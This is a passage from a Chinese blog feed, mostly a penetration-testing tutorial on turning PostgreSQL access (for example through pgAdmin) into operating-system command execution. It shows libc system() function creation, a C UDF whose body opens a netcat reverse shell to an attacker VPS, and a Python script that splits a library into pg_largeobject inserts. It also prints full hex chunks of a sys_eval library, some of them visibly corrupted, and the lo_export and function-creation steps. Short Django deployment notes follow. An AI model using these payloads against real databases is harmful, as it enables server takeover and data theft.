低版本的命令执行</h5><p>可以直接调用/lib/libc.so.6或者是/lib64/libc.so.6</p><p>一般<strong>8.2</strong>以下的版本可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(cstring) <span class="keyword">RETURNS</span> <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(cstring) RcETURNS <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib64/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br></pre></td></tr></table></figure><p>直接可以执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure><h5 id="1-2-高版本的命令执行"><a href="#1-2-高版本的命令执行" class="headerlink" title="1.2 高版本的命令执行"></a>1.2 高版本的命令执行</h5><p>当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR:  incompatible library "xxx.so": missing magic block</span><br><span class="line">HINT:  Extension libraries are required to <span class="keyword">use</span> the PG_MODULE_MAGIC macro.</span><br></pre></td></tr></table></figure><p>第一步可以先查看postgresql支持的扩展语言:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pg_language;</span><br></pre></td></tr></table></figure><p>如果支持python perl就很简单和低版本一样直接创建调用详情可参考以下文章:<br><a href="http://static.hx99.net/static/drops/tips-6449.html" target="_blank" rel="external nofollow noopener noreferrer">http://static.hx99.net/static/drops/tips-6449.html</a></p><p>当不存在其他扩展语言时,postgresql默认支持C,所以要自己传一个编译好的so库去创建可执行命令函数.这里可以使用简短的反弹shell后门</p><p>编译反弹shell后门</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"postgres.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fmgr.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">text</span> *<span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"nc -e /bin/bash vpsIPaddress 2333"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译环境见文章头部这个需要在/usr/pgsql-9.6/include/server/目录下执行应为存在postgres.h头部调用的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -I`pg_config --includedir-server` -fPIC -shared -o udf.so</span><br><span class="line">strip -sx udf.so <span class="comment">#缩减so文件大小</span></span><br></pre></td></tr></table></figure><p>将文件hex后去除\n</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat udf.so | xxd -ps | tr -d <span class="string">"\n"</span></span><br></pre></td></tr></table></figure><p>接下来我们需要将udf.so文件分割成每2048字节的块,最后一个块的大小不满足2048字节不需要考虑.<br>为什么不能小于2048?是因为在postgresql高版本处理中,<strong>如果块之间小于2048,默认会用0去填充让块达到2048字节所以上传的文件才会一直创建函数失败</strong>.</p><p>用python脚本去分割udf.so文件,2个16进制数是一个字节所以按照4096个16进制数分割：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#~/usr/bin/env python 2.7</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">number = randint(<span class="number">1000</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage:python "</span> + sys.argv[<span class="number">0</span>] + <span class="string">"inputfile"</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    fileobj = open(sys.argv[<span class="number">1</span>],<span class="string">'rb'</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    t = <span class="number">-1</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fileobj.read():</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        s += b</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">4096</span> == <span class="number">0</span>:</span><br><span class="line">            t = t + <span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'insert into pg_largeobject values (&#123;number&#125;, &#123;block&#125;, decode(\'&#123;payload&#125;\',\'hex\'));\n'</span>\</span><br><span class="line">                    .format(number=number, block=t, payload=s)</span><br><span class="line">            s = <span class="string">''</span></span><br><span class="line">    fileobj.close()</span><br></pre></td></tr></table></figure><p>分割完成后按照下文中的sql语句执行：<br>1.写入对象<br>2.创建文件<br>3.建立函数<br>4.执行命令<br>5.清理函数</p><p>如果不能反弹shell也可以使用sqlmap提供的UDF命令执行的函数：<br><a href="https://github.com/sqlmapproject/udfhack/blob/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/sqlmapproject/udfhack/blob/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c</a></p><p>这里我直接给出hex分片过sql语句直接写入即可创建成功（9.6版本测试有效，如果目标是更加新的版本需要对应安装postgresql-dev扩展包编译代码）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">9023</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">0</span>, <span class="keyword">decode</span>(<span class="string">'7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e00200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000cc11000000000000cc11000000000000cc110000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f81d000000000000f81d200000000000f81d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e550052705bc9352a28aa252e8edf0fbc5d4c32e634e800000000030000001a00000002000000070000008440030810890c99880c008dc84400001a0000002100000026000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900580b0000000000000000000000000000de00000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007601000012000000000000000000000000000000000000006f01000012000000000000000000000000000000000000003a0100001200000000000000000000000000000000000000d60000001200000000000000000000000000000000000000110100001200000000000000000000000000000000000000fb0000001200000000000000000000000000000000000000690100001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000c500000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000006301000012000000000000000000000000000000000000000101000012000000000000000000000000000000000000003f0100001200000000000000000000000000000000000000f500000012000000000000000000000000000000000000005d0100001200000000000000000000000000000000000000320100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000dd00000010000000000000000000000000000000000000002d0100001200000000000000000000000000000000000000e300000012000b00d20e0000000000000800000000000000bc00000012000b00850e0000000000004d000000000000008601000010001600d0202000000000000000000000000000b300000012000b007d0e0000000000000800000000000000ec00000012000b00da0e000000000000c3000000000000009901000010001700d82020000000000000000000000000005001000012000b003b1000000000000031010000000000001801000012000b009d0f00000000000008000000000000008300000012000b00ed0d00000000000030000000000000008d01000010001700d02020000000000000000000000000001000000012000900580b00000000000000000000000000002101000012000b00a50f0000000000008e000000000000007500000012000b00e50d00000000000008000000000000001600000012000c006c1100000000000000000000000000004701000012000b00331000000000000008000000000000009f00000012000b001d0e0000000000006000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006368725f7074725f746f5f746578745f7074720070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e006667657473007265616c6c6f63007374726e6370790070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">1</span>, <span class="keyword">decode</span>(<span class="string">'0200000002000200020002000200020002000000000002000200020002000200020002000000000002000000020001000100010001000100010001000100010001000100010001000100010001000000010001007c0100001000000000000000751a6909000002009e01000000000000f81d2000000000000800000000000000b00d000000000000001e2000000000000800000000000000700d000000000000101e2000000000000800000000000000101e200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000c0000000000000000000000e81f20000000000006000000150000000000000000000000f01f20000000000006000000160000000000000000000000f81f200000000000060000001700000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000002200000000000000000000006020200000000000070000000b00000000000000000000006820200000000000070000000c00000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000e00000000000000000000008020200000000000070000000f0000000000000000000000882020000000000007000000100000000000000000000000902020000000000007000000110000000000000000000000982020000000000007000000120000000000000000000000a02020000000000007000000130000000000000000000000a82020000000000007000000140000000000000000000000b02020000000000007000000170000000000000000000000b82020000000000007000000180000000000000000000000c02020000000000007000000190000000000000000000000c820200000000000070000002900000000000000000000004883ec08488b057d1420004885c07405e8c30000004883c408c30000000000000000000000000000ff3582142000ff25841420000f1f4000ff25821420006800000000e9e0ffffffff257a1420006801000000e9d0ffffffff25721420006802000000e9c0ffffffff256a1420006803000000e9b0ffffffff25621420006804000000e9a0ffffffff255a1420006805000000e990ffffffff25521420006806000000e980ffffffff254a1420006807000000e970ffffffff25421420006808000000e960ffffffff253a1420006809000000e950ffffffff2532142000680a000000e940ffffffff252a142000680b000000e930ffffffff2522142000680c000000e920ffffffff251a142000680d000000e910ffffffff2512142000680e000000e900ffffffff250a142000680f000000e9f0feffffff25021420006810000000e9e0feffffff25fa1320006811000000e9d0feffffff25f21320006812000000e9c0feffffff25ea1320006813000000e9b0feffffff25e21320006814000000e9a0feffffff25da1320006815000000e990feffffff25d21320006816000000e980feffff488d05d0132000488d3dc2132000554829f84889e54883f80e77025dc3488b05b41220004885c074f25dffe00f1f4000488d0599132000488d3d92132000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b158f1220004885d274f25d4889c6ffe20f1f4000803d5913200000752748833d7712200000554889e5740c488d3d82102000e82dffffffe868ffffff5dc6053013200001f3c30f1f4000662e0f1f84000000000048833d50102000007426488b05271220004885c0741a55488d3d3a1020004889e5ffd05de957ffffff0f1f8000000000e94bffffff488d05c4030000c355534889fb508b17c1ea028d6afc8d7d014863ffe84afeffff4863d5488d73044889c74889d1f3a4c60410005a5b5dc341544983ccff4c89e15531ed4088e8534889fbf2ae48f7d1488d7903e812feffff4889df4889c24c89e14088e84889def2ae4889df48f7d18d048d0c0000004c89e189024088e8f2ae488d420448f7d14c01e14889c74889d0f3a45b5d415cc3488d0528030000c341554154554889fd5351488b7f20e8a8fdffff4889c74889c3e86dfdffff4989c44889c7e832fdffff4c89e74189c5e8d7fcffff483b5d2074084889dfe809feffff5a5b5d415c4489e8415dc3488d05cf020000c34157415641554154555352488b7f20e852fdffff4889c7e81afdffffbf000400004889c5e84dfdffffbf010000004989c4e840fdffff488d35690200004889efc600004889c331ede869fdffff4989c54c89eabe080000004c89e7e8c6fcffff4885c0743931c04c89e74883c9fff2ae4889df48f7d14c8d71ff468d7c35004963f7e80ffdffff488d3c284963d64c89e64889c34963efe82afcffffebb24c89efe870fcffff803b007405c6442bff00584889df5b5d415c415d415e415fe953fdffff488d0500020000c341545553488b7f20e88efcffff4989c48b28e824fdffff85c07907b801000000eb677555c1ed02bf1e000000e8dafcffff83ed04488d70ff4531c94863ed4531c031ff488d042e48f7d6b921000000ba070000004821c6e8cffbff'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">2</span>, <span class="keyword">decode</span>(<span class="string">'ff4883f8ff4889c374b6498d7424044889ea4889c7e886fbffffffd3eb0eba0100000031f689c7e854fcffff31c05b5d415cc3488d0566010000c341574989ff41564155415455534883ec28488b7f20e8ebfbffff488d7c240f488d3524010000b911000000f3a44889c7e8a0fbffff488d350b0100004889c74989c4e81efcffff4885c04889c3744431f6ba020000004889c7e8c7fbffff4889dfe87ffbffff31d231f64889c54889df4189c5e8adfbffff8d7d014863ffe892fbffff4885c04989c675144889dfe8f2faffff41c6471c0131c0e9830000004889d9ba010000004863f54889c7e8c3faffff4889dfe8cbfaffff8d7c2d014863ffe84ffbffff31d24889c34139d58d04127e23418a041688c183e00fc0e9048a44040f83e10f8a4c0c0f88445301880c5348ffc2ebd548984889dfc6040300e8b1fbffff4889df4889c5e846faffff4c89f7e83efaffff4c89e7e836faffff4889e84883c4285b5d415c415d415e415fc34883ec084883c408c300000000000000000000007200726200303132333435363738394142434445460000000000000000000000010000000100000001000000010000001c0000008a0300006400000020000000400000000100000001000000011b033b680000000c000000b4f9ffff8400000019fcffffac00000021fcffffc400000051fcffffec000000b1fcffff1c010000b9fcffff3401000006fdffff6c0100000efdffff84010000d1fdffffcc010000d9fdffffe401000067feffff140200006ffeffff2c0200001400000000000000017a5200017810011b0c070890010000240000001c00000028f9ffff80010000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000065fbffff080000000000000000000000240000005c00000055fbffff3000000000410e108602410e188303440e20670e18410e10410e08002c000000840000005dfbffff6000000000420e108c02480e188603460e208304024c0e18410e10420e0800000000000014000000b40000008dfbffff08000000000000000000000034000000cc0000007dfbffff4d00000000420e108d02420e188c03410e208604440e288305410e30790e28410e20410e18420e10450e0800140000000401000092fbffff080000000000000000000000440000001c01000082fbffffc300000000420e108f02420e188e03420e208d04420e288c05410e308606410e388307410e4002a60e38440e30410e28420e20420e18420e10420e081400000064010000fdfbffff0800000000000000000000002c0000007c010000edfbffff8e00000000420e108c02410e188603410e20830402860e18410e10420e0800000000000014000000ac0100004bfcffff0800000000000000000000004c000000c40100003bfcffff3101000000420e108f02450e188e03420e208d04420e288c05410e308606410e388307440e600315010e38410e30410e28420e20420e18420e10420espan>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">3</span>, <span class="keyword">decode</span>(<span class="stringb00d000000000000700d0000000000000000000000000000101e20000000000001000000000000007c010000000000000c00000000000000580b0000000000000d000000000000006c110000000000001900000000000000f81d2000000000001b0000000000000008000000000000001a00000000000000001e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000005006000000000000060000000000000060020000000000000a00000000000000aa010000000000000b00000000000000180000000000000003000000000000000020200000000000020000000000000028020000000000001400000000000000070000000000000017000000000000003009000000000000070000000000000070080000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f000000005008000000000000ffffff6f000000000100000000000000f0ffff6f00000000fa07000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">4</span>, <span class="keyword">decode</span>(<span class="string">'181e20000000000000000000000000000000000000000000960b000000000000a60b000000000000b60b000000000000c60b000000000000d60b000000000000e60b000000000000f60b000000000000060c000000000000160c000000000000260c000000000000360c000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c0000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31362900002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000001e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000280000000b000000020000000000000060020000000000006002000000000000f0030000000000000400000002000000080000000000000018000000000000003000000003000000020000000000000050060000000000005006000000000000aa0100000000000000000000000000000100000000000000000000000000000038000000ffffff6f0200000000000000fa07000000000000fa07000000000000540000000000000003000000000000000200000000000000020000000000000045000000feffff6f02000000000000005008000000000000500800000000000020000000000000000400000001000000080000000000000000000000000000005400000004000000020000000000000070080000000000007008000000000000c0000000000000000300000000000000080000000000000018000000000000005e000000040000004200000000000000300900000000000030090000000000002802000000000000030000000a0000000800000000000000180000000000000068000000010000000600000000000000580b000000000000580b0000000000001a0000000000000000000000000000000400000000000000000000000000000063000000010000000600000000000000800b000000000000800b00000000000080010000000000000000000000000000100000000000000010000000000000006e000000010000000600000000000000000d000000000000000d0000000000006c04000000000000000000000000000010000000000000000000000000000000740000000100000006000000000000006c110000000000006c1100000000000009000000000000000000000000000000040000000000000000000000000000007a000000010000000200000000000000801100000000000080110000000000004c0000000000000000000000000000001000000000000000000000000000000082000000010000000200000000000000cc11000000000000cc110000000000006c00000000000000000000000000000004000000000000000000000000000000900000000100000002000000000000003812000000000000381200000000000014020000000000000000000000000000080000000000000000000000000000009a0000000e0000000300000000000000f81d200000000000f81d0000000000000800000000000000000000000000000008000000000000000000000000000000a60000000f0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000b2000000010000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000b7000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000c4000000060000000300000000000000181e200000000000181e000000000000c001000000000000040000000000000008000000000000001000000000000000cd000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d200000001000000030000000000000000202000000000000020000000000000d000000000000000000000000000000008000000000000000800000000000000db000000080000000300000000000000d020200000000000d0200000000000000800000000000000000000000000000001000000000000000000000000000000e00000000100000030000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">5</span>, <span class="keyword">decode</span>(<span class="string">'d0200000000000002d00000000000000000000000000000001000000000000000100000000000000010000000300000000000000000000000000000000000000fd20000000000000e900000000000000000000000000000001000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">9023</span>, <span class="string">'/tmp/testeval.so'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">执行命令：</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> sys_eval(<span class="built_in">text</span>) <span class="keyword">RETURNS</span> <span class="built_in">text</span> <span class="keyword">AS</span> <span class="string">'/tmp/testeval.so'</span>, <span class="string">'sys_eval'</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">RETURNS</span> <span class="literal">NULL</span> <span class="keyword">ON</span> <span class="literal">NULL</span> <span class="keyword">INPUT</span> IMMUTABLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">'id'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure><h2 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h2><p><a href="http://www.91ri.org/6507.html" target="_blank" rel="external nofollow noopener noreferrer">http://www.91ri.org/6507.html</a></p><p><a href="http://static.hx99.net/static/drops/tips-6449.html" target="_blank" rel="external nofollow noopener noreferrer">http://static.hx99.net/static/drops/tips-6449.html</a></p><p><a href="http://www.voidcn.com/article/p-sunyuemo-nw.html" target="_blank" rel="external nofollow noopener noreferrer">http://www.voidcn.com/article/p-sunyuemo-nw.html</a></p><p><a href="https://www.jianshu.com/p/ba0297da2c2e" target="_blank" rel="external nofollow noopener noreferrer">https://www.jianshu.com/p/ba0297da2c2e</a></p><p><a href="http://www.postgres.cn/docs/9.4/catalog-pg-largeobject.html" target="_blank" rel="external nofollow noopener noreferrer">http://www.postgres.cn/docs/9.4/catalog-pg-largeobject.html</a></p><p><a href="https://github.com/sqlmapproject/udfhack/" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/sqlmapproject/udfhack/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习postgresql数据库如何getshell是在渗透中遇到一个pgAdmin的web管理页面可以直接操作postgresql且通过网上的文章没有达到9.6版本getshell的效果所以便有了以下文章。&lt;strong&gt;解决新版本写入函数so文件创建函数失败问题.&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>virtualenv使用nginx+uwsgi部署django应用</title>
    <link href="http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%9C%A8virtualenv%E4%BD%BF%E7%94%A8nginx+uwsgi%E9%83%A8%E7%BD%B2django%E5%BA%94%E7%94%A8/"/>
    <id>http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%9C%A8virtualenv%E4%BD%BF%E7%94%A8nginx+uwsgi%E9%83%A8%E7%BD%B2django%E5%BA%94%E7%94%A8/</id>
    <published>2017-10-17T13:18:48.000Z</published>
    <updated>2020-04-08T02:42:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="virtualenv使用nginx-uwsgi部署django应用"><a href="#virtualenv使用nginx-uwsgi部署django应用" class="headerlink" title="virtualenv使用nginx+uwsgi部署django应用"></a>virtualenv使用nginx+uwsgi部署django应用</h1><p>浅谈cgi、wsgi、uwsgi 与 uWSGI<br><a href="https://www.rapospectre.com/blog/31" target="_blank" rel="external nofollow noopener noreferrer" title="https://www.rapospectre.com/blog/31">https://www.rapospectre.com/blog/31</a></p><p>基础安装<br><a href="https://www.rapospectre.com/blog/31" target="_blank" rel="external nofollow noopener noreferrer" title="http://www.projectsedu.com/2017/08/15/centos7-%E4%B8%8B%E9%80%9A%E8%BF%87nginx-uwsgi%E9%83%A8%E7%BD%B2django%E5%BA%94%E7%94%A8/">http://www.projectsedu.com/2017/08/15/centos7-%E4%B8%8B%E9%80%9A%E8%BF%87nginx-uwsgi%E9%83%A8%E7%BD%B2django%E5%BA%94%E7%94%A8/</a></p><p>解决虚拟环境下uwsgi路径问题<br>ImportError: No module named django.core.wsgi<br><a href="https://stackoverflow.com/questions/14194859/importerror-no-module-named-django-core-wsgi-for-uwsgi" target="_blank" rel="external nofollow noopener noreferrer" title="https://stackoverflow.com/questions/14194859/importerror-no-module-named-django-core-wsgi-for-uwsgi">https://stackoverflow.com/questions/14194859/importerror-no-module-named-django-core-wsgi-for-uwsgi</a></p><p>使用:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">print</span> <span class="string">'===== sys.path / PYTHONPATH ====='</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> sorted(os.environ.keys()):</span><br><span class="line">    v = os.environ[k]</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%-30s %s'</span> % (k,v[:<span class="number">70</span>]))</span><br></pre></td></tr></table></figure><p>查看系统python环境(可以用来查看虚拟环境)</p><p>在centos下如果访问404/502不是配置文件问题就是目录权限问题<br>配置文件记得看清楚/etc/nginx/conf.d/uc_nginx.conf的server<br>目录权限给出nginx权限</p><p>重启uwsgi直接pkill -f uwsgi会自动重启进程</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;virtualenv使用nginx-uwsgi部署django应用&quot;&gt;&lt;a href=&quot;#virtualenv使用nginx-uwsgi部署django应用&quot; class=&quot;headerlink&quot; title=&quot;virtualenv使用nginx+uwsgi部署d
      
    
    </summary>
    
    
      <category term="编程记录" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Django后台扩展之xadmin系统搭建和优化</title>
    <link href="http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/python%20Django%E5%90%8E%E5%8F%B0%E6%89%A9%E5%B1%95%E4%B9%8Bxadmin%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BC%98%E5%8C%96/"/>
    <id>http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/python%20Django%E5%90%8E%E5%8F%B0%E6%89%A9%E5%B1%95%E4%B9%8Bxadmin%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BC%98%E5%8C%96/</id>
    <published>2017-07-18T08:18:48.000Z</published>
    <updated>2020-04-08T02:39:50.000Z</updated>
    
